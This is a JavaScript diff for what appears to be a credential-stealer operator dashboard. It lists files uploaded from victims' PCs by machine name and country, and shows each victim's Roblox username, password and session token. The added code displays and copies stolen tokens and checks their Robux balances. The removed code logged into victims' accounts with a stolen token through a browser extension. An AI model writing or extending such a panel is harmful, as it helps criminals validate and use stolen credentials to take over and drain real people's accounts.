@@ -1,7 +1,7 @@
 // ── Дашборд (статическая версия для GitHub Pages) ─────────────────────────────
 if (!requireLogin()) throw new Error('redirect');
 
-document.getElementById('sidebarSlot').innerHTML = renderHeader('files');
+document.getElementById('headerSlot').innerHTML = renderHeader('files');
 bindLogout();
 
 let allFiles = [];
@@ -34,17 +34,11 @@ async function loadFiles() {
 }
 
 function updateStats() {
+  document.getElementById("sTotal").textContent = allFiles.length;
   const pcs = new Set(allFiles.map(function(f) { return f.computer?.name || "Unknown"; })).size;
   document.getElementById("sPCs").textContent = pcs;
-  
-  let robloxCount = 0;
-  for (let f of allFiles) {
-    if (f.roblox && f.roblox.security) {
-      robloxCount++;
-    }
-  }
-  document.getElementById("sRoblox").textContent = robloxCount;
-  
+  const totalSize = allFiles.reduce(function(s, f) { return s + (f.size || 0); }, 0);
+  document.getElementById("sSize").textContent = fmtSize(totalSize);
   const last = allFiles[0];
   document.getElementById("sLast").textContent = last ? fmtDate(last.uploadedAt) : "—";
 }
@@ -102,20 +96,14 @@ function renderFiles(list) {
       previewHTML = "<div class='card-preview-icon'>" + icon(nm) + "</div>";
     }
 
-    const hasRoblox = f.roblox && f.roblox.security && f.roblox.security.length > 0;
-    const isValid = f.robuxInfo ? f.robuxInfo.valid !== false : true;
-
-    let indicator = "";
-    if (hasRoblox) {
-      const color = isValid ? "var(--success)" : "var(--danger)";
-      indicator = "<div class='roblox-indicator' style='position:absolute; top:12px; right:12px; width:10px; height:10px; border-radius:50%; background:" + color + "; box-shadow:0 0 10px " + color + ";' title='" + (isValid ? "Roblox токен найден" : "Токен недействителен") + "'></div>";
-    }
-
-    html += "<div class='file-card' onclick=\"openModalByIndex(" + idx + ")\" style='position:relative'>" +
-              indicator +
+    html += "<div class='file-card' onclick=\"openModalByIndex(" + idx + ")\">" +
               "<div class='card-preview'>" + previewHTML + "</div>" +
               "<div class='card-body'>" +
                 "<div class='card-title' title='" + escapeHtml(pcName) + "'>" + escapeHtml(pcName) + "</div>" +
+                "<div class='card-meta'>" +
+                  "<span class='badge badge-pc'>🌍 " + escapeHtml(pcCountry) + "</span>" +
+                  "<span class='badge badge-size'>" + fmtSize(f.size || 0) + "</span>" +
+                "</div>" +
               "</div>" +
             "</div>";
   }
@@ -162,60 +150,55 @@ function openModalByIndex(idx) {
   const roblox = f.roblox || {};
   const robuxInfo = f.robuxInfo || {};
   const hasToken = roblox.security && roblox.security.length > 0;
-  const isValid = robuxInfo.valid !== false;
 
   document.getElementById("robloxSpecUser").textContent = roblox.user || "—";
+  document.getElementById("robloxSpecPass").textContent = roblox.pass || "—";
 
-  const loginBtn = document.getElementById("modalLoginBtn");
-  const tokenStatusRow = document.getElementById("tokenStatusRow");
-  const tokenStatusText = document.getElementById("tokenStatusText");
-
-  const lastLogin = localStorage.getItem('login_' + f.name);
-  let loginText = '👤 Войти в аккаунт';
-  if (lastLogin) {
-    const d = new Date(parseInt(lastLogin));
-    loginText = '👤 Заходил ' + d.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) + ' ' + d.toLocaleDateString();
-  }
-  loginBtn.textContent = loginText;
-
-  if (hasToken && isValid) {
-    loginBtn.style.display = "";
-    loginBtn.onclick = function() {
-      loginBtn.textContent = '⏳...';
-      loginBtn.disabled = true;
-
-      function handler(e) {
-        if (e.data && e.data.type === 'nexus-login-response') {
-          window.removeEventListener('message', handler);
-          if (e.data.ok) {
-            localStorage.setItem('login_' + f.name, Date.now());
-            const d = new Date();
-            loginBtn.textContent = '👤 Заходил ' + d.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) + ' ' + d.toLocaleDateString();
-            loginBtn.disabled = false;
-            toast('✅ Вход выполнен, открываем Roblox...');
-          } else {
-            loginBtn.textContent = loginText;
-            loginBtn.disabled = false;
-            toast('⚠️ Установи расширение NEXUS для входа', 'err');
-          }
-        }
-      }
-
-      window.addEventListener('message', handler);
-      window.postMessage({ type: 'nexus-login', token: roblox.security }, '*');
-      
-      setTimeout(() => {
-        window.removeEventListener('message', handler);
-        loginBtn.textContent = loginText;
-        loginBtn.disabled = false;
-        toast('⚠️ Установи расширение NEXUS для входа', 'err');
-      }, 800);
-    };
-    tokenStatusRow.style.display = "none";
+  const tokEl = document.getElementById("robloxSpecToken");
+  const copyBtn = document.getElementById("robloxCopyBtn");
+  if (hasToken) {
+    tokEl.textContent = roblox.security;
+    tokEl.scrollTop = 0;
+    currentToken = roblox.security;
+    copyBtn.style.display = "";
   } else {
-    loginBtn.style.display = "none";
-    tokenStatusRow.style.display = "flex";
-    tokenStatusText.textContent = hasToken ? "Токен недействителен" : "Токен отсутствует";
+    tokEl.textContent = "—";
+    currentToken = "";
+    copyBtn.style.display = "none";
+  }
+
+  const robuxRow = document.getElementById("robloxSpecRobuxRow");
+  const statusRow = document.getElementById("robloxSpecStatusRow");
+  const robuxEl = document.getElementById("robloxSpecRobux");
+  const statusEl = document.getElementById("robloxSpecStatus");
+
+  if (robuxInfo.robux !== undefined) {
+    robuxRow.style.display = "flex";
+    if (robuxInfo.valid === false) {
+      robuxEl.textContent = "❌";
+      robuxEl.style.color = "var(--danger)";
+      statusRow.style.display = "flex";
+      statusEl.textContent = "Токен недействителен";
+      statusEl.style.color = "var(--danger)";
+    } else {
+      robuxEl.textContent = robuxInfo.robux.toLocaleString() + " R$";
+      robuxEl.style.color = "var(--success)";
+      if (robuxInfo.checked) {
+        statusRow.style.display = "flex";
+        statusEl.textContent = "Проверен: " + new Date(robuxInfo.checked).toLocaleString("ru");
+        statusEl.style.color = "var(--text-secondary)";
+      }
+    }
+  } else if (roblox.security) {
+    robuxRow.style.display = "flex";
+    robuxEl.textContent = "⏳ Не проверен";
+    robuxEl.style.color = "var(--warning)";
+    statusRow.style.display = "flex";
+    statusEl.textContent = "Нажми «Проверить Robux»";
+    statusEl.style.color = "var(--text-secondary)";
+  } else {
+    robuxRow.style.display = "none";
+    statusRow.style.display = "none";
   }
 
   const requestEl = document.getElementById("tokenRequestStatus");
@@ -228,18 +211,36 @@ function openModalByIndex(idx) {
     requestEl.style.color = "var(--text-secondary)";
   }
 
-  // Preview pane removed
+  const pane = document.getElementById("modalPreviewPane");
+  if (isImg(nm)) {
+    pane.innerHTML = "<img src='" + dlUrl + "' alt=''>";
+  } else if (isVid(nm)) {
+    pane.innerHTML = "<video src='" + dlUrl + "' controls autoplay></video>";
+  } else if (isAud(nm)) {
+    pane.innerHTML = "<audio src='" + dlUrl + "' controls autoplay></audio>";
+  } else if (isText(nm)) {
+    pane.innerHTML = "<div class='modal-preview-text'>Загрузка файла...</div>";
+    apiFetch("/uploads/" + encodeURIComponent(f.name)).then(res => res.text()).then(t => {
+      const escaped = t.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+      pane.querySelector(".modal-preview-text").innerHTML = escaped;
+    }).catch(e => {
+      pane.querySelector(".modal-preview-text").textContent = "Не удалось прочесть файл.";
+    });
+  } else {
+    pane.innerHTML = "<div class='card-preview-icon' style='font-size: 7rem; opacity: 0.5;'>" + icon(nm) + "</div>";
+  }
 
-  // Removed modalRobuxBtn
+  document.getElementById("modalRobuxBtn").onclick = function() { checkRobux(f.name); };
   document.getElementById("modalRequestBtn").onclick = function() { requestToken(f.name); };
-  // Removed modalRequestStatusBtn
+  document.getElementById("modalRequestStatusBtn").onclick = function() { refreshRequestStatus(f.name); };
   document.getElementById("modalDeleteBtn").onclick = function() { deleteFile(f.name); };
 
-  document.getElementById("fileModal").classList.add("active");
+  document.getElementById("fileModal").style.display = "flex";
 }
 
 function closeModal() {
-  document.getElementById("fileModal").classList.remove("active");
+  document.getElementById("fileModal").style.display = "none";
+  document.getElementById("modalPreviewPane").innerHTML = "";
 }
 
 function copyToken() {
